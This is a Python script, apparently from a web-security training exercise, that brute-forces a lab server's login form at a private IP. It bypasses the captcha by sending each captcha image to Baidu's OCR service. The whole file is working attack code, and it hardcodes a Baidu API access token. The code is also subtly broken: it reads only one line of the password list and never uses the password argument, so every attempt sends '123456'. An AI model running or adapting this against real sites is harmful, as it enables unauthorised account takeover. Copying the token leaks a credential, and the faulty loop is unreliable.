# encoding:utf-8
import time

import requests
import base64

'''
通用文字识别（高精度版）
'''

# request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"
# # 二进制方式打开图片文件
# f = open('D:\WEBSecurity\Web\image\\vcode.png', 'rb')
# img = base64.b64encode(f.read())
#
# params = {"image": img}
# access_token = '24.1dcf145291d73067a1069040692b3868.2592000.1658939652.282335-26564834'
# request_url = request_url + "?access_token=" + access_token
# headers = {'content-type': 'application/x-www-form-urlencoded'}
# response = requests.post(request_url, data=params, headers=headers)
# print(response.text)


# 利用orc实现爆破
def burst_login(password):
    # 虽然百度接口可以直接读取验证码的URL地址，但是内网ip不行
    data = {'http://192.168.2.128/Security/vcode.php'}

    session = requests.session()

    # 先获取验证码的图片的二进制数据
    resp_vcode = session.get('http://192.168.2.128/Security/vcode.php')
    img = base64.b64encode(resp_vcode.content)
    params = {"image": img}
    baidu_request_url = "https://aip.baidubce.com/rest/2.0/ocr/v1/accurate_basic"

    access_token = '24.1dcf145291d73067a1069040692b3868.2592000.1658939652.282335-26564834'
    baidu_request_url = baidu_request_url + "?access_token=" + access_token
    headers = {'content-type': 'application/x-www-form-urlencoded'}
    response_baidu = requests.post(baidu_request_url, data=params, headers=headers)
    vcode='0000'
    print(response_baidu.json())
    if response_baidu:
        vcode = response_baidu.json()['words_result'][0]['words']
    print(vcode)
    #进行登录的爆破
    url = 'http://192.168.2.128/Security/login.php'

    # print(resp.text)


    data = {'username': 'woniu', 'password': '123456', 'vcode': vcode}
    resp = session.post(url=url, data=data)
    if'vcode-error'in resp.text:
        print('验证码错误')
    if ("login-fail" not in resp.text)and('vcode-error' not in resp.text):
        print(f'登录成功，payload为：{data}')



if __name__ == '__main__':
    with open('../dict/password.txt') as file:
        pass_list=file.readline()

    for password in pass_list:
        burst_login(password.strip())
        time.sleep(2)
